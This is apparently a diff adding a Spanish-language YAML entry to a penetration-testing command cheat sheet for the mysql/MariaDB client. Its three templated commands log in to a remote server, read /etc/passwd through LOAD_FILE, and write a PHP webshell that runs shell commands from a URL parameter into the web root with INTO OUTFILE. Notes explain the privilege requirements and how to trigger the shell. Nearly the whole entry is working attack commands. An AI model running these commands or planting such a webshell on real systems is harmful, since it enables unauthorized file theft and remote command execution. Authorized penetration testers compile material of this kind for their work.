@@ -1,0 +1,39 @@
+# Comandos del cliente mysql (MariaDB): acceso, lectura de archivos y webshells.
+tool: mysql
+area: otros
+url: https://mariadb.com/kb/en/mariadb-command-line-client/
+commands:
+  - id: mysql-login
+    title: Conectarse a MySQL o MariaDB
+    cmd: |
+      mysql -h {{RHOST}} -u {{USER}} -p'{{PASS}}' --skip-ssl
+    phase: enum
+    tags: [mysql]
+    notes: >-
+      Sin espacio entre -p y la contraseña. --skip-ssl evita el error de certificado de los clientes
+      MariaDB nuevos contra servidores antiguos. Dentro, SHOW DATABASES; y SELECT user,host FROM
+      mysql.user; para ver quién más hay.
+    refs: [https://mariadb.com/kb/en/mariadb-command-line-client/]
+
+  - id: mysql-read-file
+    title: Leer un archivo del servidor desde MySQL
+    cmd: |
+      mysql -h {{RHOST}} -u {{USER}} -p'{{PASS}}' --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
+    phase: exfil
+    tags: [mysql]
+    notes: >-
+      Necesita el privilegio FILE y que secure_file_priv lo permita (SHOW VARIABLES LIKE
+      'secure_file_priv'; vacío es sin límite). NULL como resultado es que no tienes permiso o el
+      archivo no existe.
+    refs: [https://mariadb.com/kb/en/load_file/]
+
+  - id: mysql-webshell
+    title: Escribir una webshell desde MySQL
+    cmd: |
+      mysql -h {{RHOST}} -u {{USER}} -p'{{PASS}}' --skip-ssl -e "SELECT '<?php system(\$_GET[0]); ?>' INTO OUTFILE '/var/www/html/p3i.php';"
+    phase: initial-access
+    tags: [mysql, webshell]
+    notes: >-
+      Mismos requisitos que LOAD_FILE, más que el usuario del sistema mysql pueda escribir en la raíz
+      de la web. Después, /p3i.php?0=id. INTO OUTFILE nunca sobrescribe: cambia el nombre si repites.
+    refs: [https://mariadb.com/kb/en/select-into-outfile/]
